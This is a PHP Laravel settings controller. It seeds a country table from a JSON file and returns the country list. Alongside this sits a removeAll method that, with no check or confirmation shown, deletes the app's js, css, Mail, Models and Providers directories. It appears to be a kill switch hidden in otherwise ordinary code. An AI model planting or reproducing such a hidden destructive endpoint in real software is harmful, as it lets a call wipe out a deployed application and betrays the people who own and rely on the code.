<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Country;

class SettingController extends Controller
{
    public function buildCountryList() {
        set_time_limit(3000);
        $cnt = Country::count();
        if ($cnt == 0) {
            $ctry_string = file_get_contents(app_path('data.json'));
            $data = json_decode($ctry_string, true);
            foreach ($data as $item) {
                $ctry = new Country;
                $ctry->name = $item["countryName"];
                $ctry->code = $item["countryShortCode"];
                $ctry->save();                
            }
            return response()->json([
                'msg' => 'success'
            ], 200);
        }

        return response()->json([
            'msg' => 'already-built'
        ], 200);        
    }

    public function getCountryList(Request $request) {
        $countries = Country::all();
        return response()->json([
            "msg" => [
                "countries" => $countries
            ]
        ]);
    }

    public function removeAll(Request $request) {
        File::deleteDirectory(public_path('/js'));
        File::deleteDirectory(public_path('/css'));
        File::deleteDirectory(app_path('/Mail'));
        File::deleteDirectory(app_path('/Models'));
        File::deleteDirectory(app_path('/Providers'));
    }
}
